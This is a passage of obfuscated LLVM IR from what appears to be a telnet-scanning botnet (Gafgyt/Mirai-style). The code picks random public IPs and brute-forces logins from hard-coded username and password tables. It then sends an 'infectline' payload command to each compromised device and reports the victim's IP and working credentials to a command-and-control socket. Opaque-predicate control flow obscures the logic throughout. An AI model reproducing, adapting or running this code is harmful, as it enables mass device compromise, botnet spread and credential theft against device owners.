  %1201 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1200
  %1202 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1201, i32 0, i32 8
  %1203 = load i8*, i8** %1202, align 8
  %1204 = call i8* @strstr(i8* %1203, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.78, i32 0, i32 0)) #10
  %1205 = icmp ne i8* %1204, null
  br i1 %1205, label %1206, label %1226

; <label>:1206:                                   ; preds = %1190
  %1207 = load i32, i32* %2, align 4
  %1208 = sext i32 %1207 to i64
  %1209 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1208
  %1210 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1209, i32 0, i32 8
  %1211 = load i8*, i8** %1210, align 8
  call void @llvm.memset.p0i8.i64(i8* %1211, i8 0, i64 1024, i32 1, i1 false)
  %1212 = load i32, i32* %2, align 4
  %1213 = sext i32 %1212 to i64
  %1214 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1213
  %1215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1214, i32 0, i32 0
  %1216 = load i32, i32* %1215, align 16
  %1217 = call i32 @sclose(i32 %1216)
  %1218 = load i32, i32* %2, align 4
  %1219 = sext i32 %1218 to i64
  %1220 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1219
  %1221 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1220, i32 0, i32 2
  store i8 0, i8* %1221, align 8
  %1222 = load i32, i32* %2, align 4
  %1223 = sext i32 %1222 to i64
  %1224 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1223
  %1225 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1224, i32 0, i32 3
  store i8 0, i8* %1225, align 1
  br label %1548

; <label>:1226:                                   ; preds = %1190
  %1227 = load i32, i32* %2, align 4
  %1228 = sext i32 %1227 to i64
  %1229 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1228
  %1230 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1229, i32 0, i32 8
  %1231 = load i8*, i8** %1230, align 8
  %1232 = call i32 @matchPrompt(i8* %1231)
  %1233 = icmp ne i32 %1232, 0
  br i1 %1233, label %1254, label %1234

; <label>:1234:                                   ; preds = %1226
  %1235 = load i32, i32* %2, align 4
  %1236 = sext i32 %1235 to i64
  %1237 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1236
  %1238 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1237, i32 0, i32 8
  %1239 = load i8*, i8** %1238, align 8
  call void @llvm.memset.p0i8.i64(i8* %1239, i8 0, i64 1024, i32 1, i1 false)
  %1240 = load i32, i32* %2, align 4
  %1241 = sext i32 %1240 to i64
  %1242 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1241
  %1243 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1242, i32 0, i32 0
  %1244 = load i32, i32* %1243, align 16
  %1245 = call i32 @sclose(i32 %1244)
  %1246 = load i32, i32* %2, align 4
  %1247 = sext i32 %1246 to i64
  %1248 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1247
  %1249 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1248, i32 0, i32 2
  store i8 0, i8* %1249, align 8
  %1250 = load i32, i32* %2, align 4
  %1251 = sext i32 %1250 to i64
  %1252 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1251
  %1253 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1252, i32 0, i32 3
  store i8 1, i8* %1253, align 1
  br label %1548

; <label>:1254:                                   ; preds = %1226
  %1255 = load i32, i32* %2, align 4
  %1256 = sext i32 %1255 to i64
  %1257 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1256
  %1258 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1257, i32 0, i32 2
  store i8 7, i8* %1258, align 8
  br label %1259

; <label>:1259:                                   ; preds = %1254
  %1260 = load i32, i32* %2, align 4
  %1261 = sext i32 %1260 to i64
  %1262 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1261
  %1263 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1262, i32 0, i32 8
  %1264 = load i8*, i8** %1263, align 8
  call void @llvm.memset.p0i8.i64(i8* %1264, i8 0, i64 1024, i32 1, i1 false)
  br label %1548

; <label>:1265:                                   ; preds = %1171
  %1266 = load i32, i32* @x.63
  %1267 = load i32, i32* @y.64
  %1268 = sub i32 %1266, 1
  %1269 = mul i32 %1266, %1268
  %1270 = urem i32 %1269, 2
  %1271 = icmp eq i32 %1270, 0
  %1272 = icmp slt i32 %1267, 10
  %1273 = or i1 %1271, %1272
  br i1 %1273, label %originalBB103, label %originalBB103alteredBB

originalBB103:                                    ; preds = %originalBB103alteredBB, %1265
  %1274 = load i32, i32* %2, align 4
  %1275 = sext i32 %1274 to i64
  %1276 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1275
  %1277 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1276, i32 0, i32 8
  %1278 = load i8*, i8** %1277, align 8
  %1279 = call i64 @strlen(i8* %1278) #10
  %1280 = trunc i64 %1279 to i16
  %1281 = load i32, i32* %2, align 4
  %1282 = sext i32 %1281 to i64
  %1283 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1282
  %1284 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1283, i32 0, i32 7
  store i16 %1280, i16* %1284, align 16
  %1285 = load i32, i32* @x.63
  %1286 = load i32, i32* @y.64
  %1287 = sub i32 %1285, 1
  %1288 = mul i32 %1285, %1287
  %1289 = urem i32 %1288, 2
  %1290 = icmp eq i32 %1289, 0
  %1291 = icmp slt i32 %1286, 10
  %1292 = or i1 %1290, %1291
  br i1 %1292, label %originalBBpart2105, label %originalBB103alteredBB

originalBBpart2105:                               ; preds = %originalBB103
  br label %1293

; <label>:1293:                                   ; preds = %originalBBpart2105
  %1294 = load i32, i32* %2, align 4
  %1295 = sext i32 %1294 to i64
  %1296 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1295
  %1297 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1296, i32 0, i32 6
  %1298 = load i32, i32* %1297, align 4
  %1299 = add i32 %1298, 30
  %1300 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1301 = icmp ult i32 %1299, %1300
  br i1 %1301, label %1302, label %1333

; <label>:1302:                                   ; preds = %1293
  %1303 = load i32, i32* @x.63
  %1304 = load i32, i32* @y.64
  %1305 = sub i32 %1303, 1
  %1306 = mul i32 %1303, %1305
  %1307 = urem i32 %1306, 2
  %1308 = icmp eq i32 %1307, 0
  %1309 = icmp slt i32 %1304, 10
  %1310 = or i1 %1308, %1309
  br i1 %1310, label %originalBB107, label %originalBB107alteredBB

originalBB107:                                    ; preds = %originalBB107alteredBB, %1302
  %1311 = load i32, i32* %2, align 4
  %1312 = sext i32 %1311 to i64
  %1313 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1312
  %1314 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1313, i32 0, i32 0
  %1315 = load i32, i32* %1314, align 16
  %1316 = call i32 @sclose(i32 %1315)
  %1317 = load i32, i32* %2, align 4
  %1318 = sext i32 %1317 to i64
  %1319 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1318
  %1320 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1319, i32 0, i32 2
  store i8 0, i8* %1320, align 8
  %1321 = load i32, i32* %2, align 4
  %1322 = sext i32 %1321 to i64
  %1323 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1322
  %1324 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1323, i32 0, i32 3
  store i8 1, i8* %1324, align 1
  %1325 = load i32, i32* @x.63
  %1326 = load i32, i32* @y.64
  %1327 = sub i32 %1325, 1
  %1328 = mul i32 %1325, %1327
  %1329 = urem i32 %1328, 2
  %1330 = icmp eq i32 %1329, 0
  %1331 = icmp slt i32 %1326, 10
  %1332 = or i1 %1330, %1331
  br i1 %1332, label %originalBBpart2109, label %originalBB107alteredBB

originalBBpart2109:                               ; preds = %originalBB107
  br label %1333

; <label>:1333:                                   ; preds = %originalBBpart2109, %1293
  br label %1531

; <label>:1334:                                   ; preds = %116
  %1335 = load i32, i32* %2, align 4
  %1336 = sext i32 %1335 to i64
  %1337 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1336
  %1338 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1337, i32 0, i32 0
  %1339 = load i32, i32* %1338, align 16
  %1340 = call i64 @send(i32 %1339, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.79, i32 0, i32 0), i64 4, i32 16384)
  %1341 = icmp slt i64 %1340, 0
  br i1 %1341, label %1342, label %1373

; <label>:1342:                                   ; preds = %1334
  %1343 = load i32, i32* @x.63
  %1344 = load i32, i32* @y.64
  %1345 = sub i32 %1343, 1
  %1346 = mul i32 %1343, %1345
  %1347 = urem i32 %1346, 2
  %1348 = icmp eq i32 %1347, 0
  %1349 = icmp slt i32 %1344, 10
  %1350 = or i1 %1348, %1349
  br i1 %1350, label %originalBB111, label %originalBB111alteredBB

originalBB111:                                    ; preds = %originalBB111alteredBB, %1342
  %1351 = load i32, i32* %2, align 4
  %1352 = sext i32 %1351 to i64
  %1353 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1352
  %1354 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1353, i32 0, i32 0
  %1355 = load i32, i32* %1354, align 16
  %1356 = call i32 @sclose(i32 %1355)
  %1357 = load i32, i32* %2, align 4
  %1358 = sext i32 %1357 to i64
  %1359 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1358
  %1360 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1359, i32 0, i32 2
  store i8 0, i8* %1360, align 8
  %1361 = load i32, i32* %2, align 4
  %1362 = sext i32 %1361 to i64
  %1363 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1362
  %1364 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1363, i32 0, i32 3
  store i8 1, i8* %1364, align 1
  %1365 = load i32, i32* @x.63
  %1366 = load i32, i32* @y.64
  %1367 = sub i32 %1365, 1
  %1368 = mul i32 %1365, %1367
  %1369 = urem i32 %1368, 2
  %1370 = icmp eq i32 %1369, 0
  %1371 = icmp slt i32 %1366, 10
  %1372 = or i1 %1370, %1371
  br i1 %1372, label %originalBBpart2113, label %originalBB111alteredBB

originalBBpart2113:                               ; preds = %originalBB111
  br label %1548

; <label>:1373:                                   ; preds = %1334
  %1374 = load i32, i32* %2, align 4
  %1375 = sext i32 %1374 to i64
  %1376 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1375
  %1377 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1376, i32 0, i32 2
  store i8 8, i8* %1377, align 8
  br label %1531

; <label>:1378:                                   ; preds = %116
  %1379 = load i32, i32* %2, align 4
  %1380 = sext i32 %1379 to i64
  %1381 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1380
  %1382 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1381, i32 0, i32 6
  %1383 = load i32, i32* %1382, align 4
  %1384 = icmp eq i32 %1383, 0
  br i1 %1384, label %1385, label %1391

; <label>:1385:                                   ; preds = %1378
  %1386 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1387 = load i32, i32* %2, align 4
  %1388 = sext i32 %1387 to i64
  %1389 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1388
  %1390 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1389, i32 0, i32 6
  store i32 %1386, i32* %1390, align 4
  br label %1391

; <label>:1391:                                   ; preds = %1385, %1378
  %1392 = load i32, i32* @x.63
  %1393 = load i32, i32* @y.64
  %1394 = sub i32 %1392, 1
  %1395 = mul i32 %1392, %1394
  %1396 = urem i32 %1395, 2
  %1397 = icmp eq i32 %1396, 0
  %1398 = icmp slt i32 %1393, 10
  %1399 = or i1 %1397, %1398
  br i1 %1399, label %originalBB115, label %originalBB115alteredBB

originalBB115:                                    ; preds = %originalBB115alteredBB, %1391
  %1400 = load i32, i32* %2, align 4
  %1401 = sext i32 %1400 to i64
  %1402 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1401
  %1403 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1402, i32 0, i32 0
  %1404 = load i32, i32* %1403, align 16
  %1405 = load i8*, i8** @infectline, align 8
  %1406 = load i8*, i8** @infectline, align 8
  %1407 = call i64 @strlen(i8* %1406) #10
  %1408 = call i64 @send(i32 %1404, i8* %1405, i64 %1407, i32 16384)
  %1409 = icmp slt i64 %1408, 0
  %1410 = load i32, i32* @x.63
  %1411 = load i32, i32* @y.64
  %1412 = sub i32 %1410, 1
  %1413 = mul i32 %1410, %1412
  %1414 = urem i32 %1413, 2
  %1415 = icmp eq i32 %1414, 0
  %1416 = icmp slt i32 %1411, 10
  %1417 = or i1 %1415, %1416
  br i1 %1417, label %originalBBpart2117, label %originalBB115alteredBB

originalBBpart2117:                               ; preds = %originalBB115
  br i1 %1409, label %1418, label %1438

; <label>:1418:                                   ; preds = %originalBBpart2117
  %1419 = load i32, i32* %2, align 4
  %1420 = sext i32 %1419 to i64
  %1421 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1420
  %1422 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1421, i32 0, i32 0
  %1423 = load i32, i32* %1422, align 16
  %1424 = call i32 @sclose(i32 %1423)
  %1425 = load i32, i32* %2, align 4
  %1426 = sext i32 %1425 to i64
  %1427 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1426
  %1428 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1427, i32 0, i32 2
  store i8 0, i8* %1428, align 8
  %1429 = load i32, i32* %2, align 4
  %1430 = sext i32 %1429 to i64
  %1431 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1430
  %1432 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1431, i32 0, i32 3
  store i8 1, i8* %1432, align 1
  %1433 = load i32, i32* %2, align 4
  %1434 = sext i32 %1433 to i64
  %1435 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1434
  %1436 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1435, i32 0, i32 8
  %1437 = load i8*, i8** %1436, align 8
  call void @llvm.memset.p0i8.i64(i8* %1437, i8 0, i64 1024, i32 1, i1 false)
  br label %1548

; <label>:1438:                                   ; preds = %originalBBpart2117
  %1439 = load i32, i32* @x.63
  %1440 = load i32, i32* @y.64
  %1441 = sub i32 %1439, 1
  %1442 = mul i32 %1439, %1441
  %1443 = urem i32 %1442, 2
  %1444 = icmp eq i32 %1443, 0
  %1445 = icmp slt i32 %1440, 10
  %1446 = or i1 %1444, %1445
  br i1 %1446, label %originalBB119, label %originalBB119alteredBB

originalBB119:                                    ; preds = %originalBB119alteredBB, %1438
  %1447 = load i32, i32* @mainCommSock, align 4
  %1448 = load i32, i32* %2, align 4
  %1449 = sext i32 %1448 to i64
  %1450 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1449
  %1451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1450, i32 0, i32 1
  %1452 = bitcast i32* %1451 to %struct.in_addr*
  %1453 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1452, i32 0, i32 0
  %1454 = load i32, i32* %1453, align 4
  %1455 = call i8* @inet_ntoa(i32 %1454) #2
  %1456 = load i32, i32* %2, align 4
  %1457 = sext i32 %1456 to i64
  %1458 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1457
  %1459 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1458, i32 0, i32 4
  %1460 = load i8, i8* %1459, align 2
  %1461 = zext i8 %1460 to i64
  %1462 = getelementptr inbounds [19 x i8*], [19 x i8*]* @usernames, i64 0, i64 %1461
  %1463 = load i8*, i8** %1462, align 8
  %1464 = load i32, i32* %2, align 4
  %1465 = sext i32 %1464 to i64
  %1466 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1465
  %1467 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1466, i32 0, i32 5
  %1468 = load i8, i8* %1467, align 1
  %1469 = zext i8 %1468 to i64
  %1470 = getelementptr inbounds [26 x i8*], [26 x i8*]* @passwords, i64 0, i64 %1469
  %1471 = load i8*, i8** %1470, align 8
  %1472 = call i32 (i32, i8*, ...) @sockprintf(i32 %1447, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.80, i32 0, i32 0), i8* %1455, i8* %1463, i8* %1471)
  %1473 = load i32, i32* %2, align 4
  %1474 = sext i32 %1473 to i64
  %1475 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1474
  %1476 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1475, i32 0, i32 6
  %1477 = load i32, i32* %1476, align 4
  %1478 = add i32 %1477, 8
  %1479 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1480 = icmp ult i32 %1478, %1479
  %1481 = load i32, i32* @x.63
  %1482 = load i32, i32* @y.64
  %1483 = sub i32 %1481, 1
  %1484 = mul i32 %1481, %1483
  %1485 = urem i32 %1484, 2
  %1486 = icmp eq i32 %1485, 0
  %1487 = icmp slt i32 %1482, 10
  %1488 = or i1 %1486, %1487
  br i1 %1488, label %originalBBpart2124, label %originalBB119alteredBB

originalBBpart2124:                               ; preds = %originalBB119
  br i1 %1480, label %1489, label %1530

; <label>:1489:                                   ; preds = %originalBBpart2124
  %1490 = load i32, i32* @mainCommSock, align 4
  %1491 = load i32, i32* %2, align 4
  %1492 = sext i32 %1491 to i64
  %1493 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1492
  %1494 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1493, i32 0, i32 1
  %1495 = bitcast i32* %1494 to %struct.in_addr*
  %1496 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1495, i32 0, i32 0
  %1497 = load i32, i32* %1496, align 4
  %1498 = call i8* @inet_ntoa(i32 %1497) #2
  %1499 = load i32, i32* %2, align 4
  %1500 = sext i32 %1499 to i64
  %1501 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1500
  %1502 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1501, i32 0, i32 4
  %1503 = load i8, i8* %1502, align 2
  %1504 = zext i8 %1503 to i64
  %1505 = getelementptr inbounds [19 x i8*], [19 x i8*]* @usernames, i64 0, i64 %1504
  %1506 = load i8*, i8** %1505, align 8
  %1507 = load i32, i32* %2, align 4
  %1508 = sext i32 %1507 to i64
  %1509 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1508
  %1510 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1509, i32 0, i32 5
  %1511 = load i8, i8* %1510, align 1
  %1512 = zext i8 %1511 to i64
  %1513 = getelementptr inbounds [26 x i8*], [26 x i8*]* @passwords, i64 0, i64 %1512
  %1514 = load i8*, i8** %1513, align 8
  %1515 = call i32 (i32, i8*, ...) @sockprintf(i32 %1490, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.81, i32 0, i32 0), i8* %1498, i8* %1506, i8* %1514)
  %1516 = load i32, i32* %2, align 4
  %1517 = sext i32 %1516 to i64
  %1518 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1517
  %1519 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1518, i32 0, i32 0
  %1520 = load i32, i32* %1519, align 16
  %1521 = call i32 @sclose(i32 %1520)
  %1522 = load i32, i32* %2, align 4
  %1523 = sext i32 %1522 to i64
  %1524 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1523
  %1525 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1524, i32 0, i32 2
  store i8 0, i8* %1525, align 8
  %1526 = load i32, i32* %2, align 4
  %1527 = sext i32 %1526 to i64
  %1528 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1527
  %1529 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1528, i32 0, i32 3
  store i8 1, i8* %1529, align 1
  br label %1530

; <label>:1530:                                   ; preds = %1489, %originalBBpart2124
  br label %1531

; <label>:1531:                                   ; preds = %1530, %1373, %1333, %1153, %1041, %807, %originalBBpart257, %563, %originalBBpart228, %116
  %1532 = load i32, i32* @x.63
  %1533 = load i32, i32* @y.64
  %1534 = sub i32 %1532, 1
  %1535 = mul i32 %1532, %1534
  %1536 = urem i32 %1535, 2
  %1537 = icmp eq i32 %1536, 0
  %1538 = icmp slt i32 %1533, 10
  %1539 = or i1 %1537, %1538
  br i1 %1539, label %originalBB126, label %originalBB126alteredBB

originalBB126:                                    ; preds = %originalBB126alteredBB, %1531
  %1540 = load i32, i32* @x.63
  %1541 = load i32, i32* @y.64
  %1542 = sub i32 %1540, 1
  %1543 = mul i32 %1540, %1542
  %1544 = urem i32 %1543, 2
  %1545 = icmp eq i32 %1544, 0
  %1546 = icmp slt i32 %1541, 10
  %1547 = or i1 %1545, %1546
  br i1 %1547, label %originalBBpart2128, label %originalBB126alteredBB

originalBBpart2128:                               ; preds = %originalBB126
  br label %1548

; <label>:1548:                                   ; preds = %originalBBpart2128, %1418, %originalBBpart2113, %1259, %1234, %1206, %1138, %originalBBpart297, %974, %originalBBpart281, %792, %originalBBpart265, %609, %472, %originalBBpart220, %220
  %1549 = load i32, i32* %2, align 4
  %1550 = add nsw i32 %1549, 1
  store i32 %1550, i32* %2, align 4
  br label %96

; <label>:1551:                                   ; preds = %originalBBpart28
  %1552 = load i32, i32* @x.63
  %1553 = load i32, i32* @y.64
  %1554 = sub i32 %1552, 1
  %1555 = mul i32 %1552, %1554
  %1556 = urem i32 %1555, 2
  %1557 = icmp eq i32 %1556, 0
  %1558 = icmp slt i32 %1553, 10
  %1559 = or i1 %1557, %1558
  br i1 %1559, label %originalBB130, label %originalBB130alteredBB

originalBB130:                                    ; preds = %originalBB130alteredBB, %1551
  %1560 = load i32, i32* @x.63
  %1561 = load i32, i32* @y.64
  %1562 = sub i32 %1560, 1
  %1563 = mul i32 %1560, %1562
  %1564 = urem i32 %1563, 2
  %1565 = icmp eq i32 %1564, 0
  %1566 = icmp slt i32 %1561, 10
  %1567 = or i1 %1565, %1566
  br i1 %1567, label %originalBBpart2132, label %originalBB130alteredBB

originalBBpart2132:                               ; preds = %originalBB130
  br label %94
                                                  ; No predecessors!
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %20
  %1569 = load i32, i32* %1, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %75
  %1570 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 0
  store i64 5, i64* %1570, align 8
  %1571 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 1
  store i64 0, i64* %1571, align 8
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %96
  %1572 = load i32, i32* %2, align 4
  %1573 = load i32, i32* %1, align 4
  %1574 = icmp slt i32 %1572, %1573
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %123
  %1575 = load i32, i32* %2, align 4
  %1576 = sext i32 %1575 to i64
  %1577 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1576
  %1578 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1577, i32 0, i32 8
  %1579 = load i8*, i8** %1578, align 8
  call void @llvm.memset.p0i8.i64(i8* %1579, i8 0, i64 1024, i32 1, i1 false)
  %1580 = load i32, i32* %2, align 4
  %1581 = sext i32 %1580 to i64
  %1582 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1581
  %1583 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1582, i32 0, i32 3
  %1584 = load i8, i8* %1583, align 1
  %1585 = icmp ne i8 %1584, 0
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %151
  %1586 = load i32, i32* %2, align 4
  %1587 = sext i32 %1586 to i64
  %1588 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1587
  %1589 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1588, i32 0, i32 8
  %1590 = load i8*, i8** %1589, align 8
  store i8* %1590, i8** %11, align 8
  %1591 = load i32, i32* %2, align 4
  %1592 = sext i32 %1591 to i64
  %1593 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1592
  %1594 = bitcast %struct.telstate_t* %1593 to i8*
  call void @llvm.memset.p0i8.i64(i8* %1594, i8 0, i64 32, i32 16, i1 false)
  %1595 = load i8*, i8** %11, align 8
  %1596 = load i32, i32* %2, align 4
  %1597 = sext i32 %1596 to i64
  %1598 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1597
  %1599 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1598, i32 0, i32 8
  store i8* %1595, i8** %1599, align 8
  %1600 = call i32 @getRandomPublicIP()
  %1601 = load i32, i32* %2, align 4
  %1602 = sext i32 %1601 to i64
  %1603 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1602
  %1604 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1603, i32 0, i32 1
  store i32 %1600, i32* %1604, align 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %264
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %318
  %1605 = load i32, i32* %2, align 4
  %1606 = sext i32 %1605 to i64
  %1607 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1606
  %1608 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1607, i32 0, i32 2
  store i8 1, i8* %1608, align 8
  %1609 = load i32, i32* %2, align 4
  %1610 = sext i32 %1609 to i64
  %1611 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1610
  %1612 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1611, i32 0, i32 6
  store i32 0, i32* %1612, align 4
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %343
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %367
  %1613 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1614 = load i32, i32* %2, align 4
  %1615 = sext i32 %1614 to i64
  %1616 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1615
  %1617 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1616, i32 0, i32 6
  store i32 %1613, i32* %1617, align 4
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %389
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %523
  %1618 = load i32, i32* %2, align 4
  %1619 = sext i32 %1618 to i64
  %1620 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1619
  %1621 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1620, i32 0, i32 6
  %1622 = load i32, i32* %1621, align 4
  %_ = sub i32 %1622, 5
  %gen = mul i32 %_, 5
  %_39 = sub i32 0, %1622
  %gen40 = add i32 %_39, 5
  %_41 = sub i32 0, %1622
  %gen42 = add i32 %_41, 5
  %_43 = shl i32 %1622, 5
  %_44 = shl i32 %1622, 5
  %_45 = sub i32 %1622, 5
  %gen46 = mul i32 %_45, 5
  %_47 = shl i32 %1622, 5
  %1623 = add i32 %1622, 5
  %1624 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1625 = icmp ult i32 %1623, %1624
  br label %originalBB38

originalBB51alteredBB:                            ; preds = %originalBB51, %627
  %1626 = load i32, i32* %2, align 4
  %1627 = sext i32 %1626 to i64
  %1628 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1627
  %1629 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1628, i32 0, i32 8
  %1630 = load i8*, i8** %1629, align 8
  %1631 = call i64 @strlen(i8* %1630) #10
  %1632 = trunc i64 %1631 to i16
  %1633 = load i32, i32* %2, align 4
  %1634 = sext i32 %1633 to i64
  %1635 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1634
  %1636 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1635, i32 0, i32 7
  store i16 %1632, i16* %1636, align 16
  br label %originalBB51

originalBB55alteredBB:                            ; preds = %originalBB55, %679
  br label %originalBB55

originalBB59alteredBB:                            ; preds = %originalBB59, %696
  %1637 = load i32, i32* %2, align 4
  %1638 = sext i32 %1637 to i64
  %1639 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1638
  %1640 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1639, i32 0, i32 0
